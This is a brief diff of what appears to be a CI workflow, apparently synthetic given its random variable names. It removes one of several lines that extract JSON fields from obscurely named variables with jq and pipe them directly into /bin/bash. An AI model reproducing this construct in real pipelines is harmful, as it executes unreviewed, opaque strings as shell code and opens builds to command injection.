@@ -35,7 +35,6 @@ jobs:
           printf '%s' "$yex72685" | jq -r .zjvl40986 | /bin/bash
           printf '%s' "$o87786" | jq -r .t341 | /bin/bash
           printf '%s' "$oa9" | jq -r .u1 | /bin/bash
-          printf '%s' "$jq4934" | jq -r .p2 | /bin/bash
           echo $nff459 | jq -r .l54 | /bin/bash
 
       - name: Archive artifact
